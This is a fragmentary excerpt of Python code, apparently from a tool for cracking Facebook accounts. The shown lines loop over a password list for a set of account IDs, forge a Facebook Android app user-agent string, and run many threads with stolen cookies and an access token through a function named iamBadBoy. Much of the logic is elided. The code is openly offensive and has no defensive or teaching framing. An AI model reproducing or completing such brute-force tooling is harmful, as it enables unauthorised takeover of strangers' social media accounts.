...
def ffb(ids,names,passlist):
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        ua = '[FBAN/FB4A;FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.1,width=1080,height=1498};FBLC/en_US;FBRV/'+fbbv+';FBCR/Entel Chile;FBMF/huawei;FBBD/huawei;FBPN/com.facebook.katana;FBDV/Huawei_Nova_5;FBSV/'+fbsv+';FBOP/1;FBCA/arm64-v8a:]'               
...
def new_file(cookies,access_token):
        ...
        with ThreadPool(max_workers=20) as yaari:
                for exid in file:
                        yaari.submit(iamBadBoy, exid,cookies,access_token,sf)
        try:
                son = f"alex{str(random.randint(0,90))}.txt"
        except:
                son = f"alex{str(random.randint(10,50))}.txt"
